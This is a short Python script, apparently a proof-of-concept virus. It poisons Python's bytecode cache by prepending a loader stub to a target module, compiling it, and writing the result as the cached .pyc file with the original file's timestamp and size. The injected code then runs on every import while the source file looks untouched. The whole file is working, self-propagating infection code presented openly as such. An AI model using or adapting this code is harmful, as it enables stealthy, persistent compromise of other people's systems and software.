#! /usr/bin/env python3

from importlib.util import cache_from_source
import importlib._bootstrap_external
import importlib.machinery
import importlib.util
import os

INFECTION = """
from importlib.machinery import SourceFileLoader
foo = SourceFileLoader("infector.py", "{}").load_module()
"""


def infect(filename):
    """Squash errors while infecting the given file."""
    try:
        _infect(filename)
    except Exception:
        raise


def _infect(filename):
    """Infect the given file."""
    cfile = importlib.util.cache_from_source(filename)
    loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
    source_bytes = loader.get_data(filename)
    source_bytes = INFECTION.format(os.path.dirname(__file__)).encode("ascii") + source_bytes
    code = loader.source_to_code(source_bytes, filename)
    try:
        dirname = os.path.dirname(cfile)
        if dirname:
            os.makedirs(dirname)
    except FileExistsError:
        pass
    source_stats = loader.path_stats(filename)
    bytecode = importlib._bootstrap_external._code_to_bytecode(
            code, source_stats['mtime'], source_stats['size'])
    mode = importlib._bootstrap_external._calc_mode(filename)
    importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)
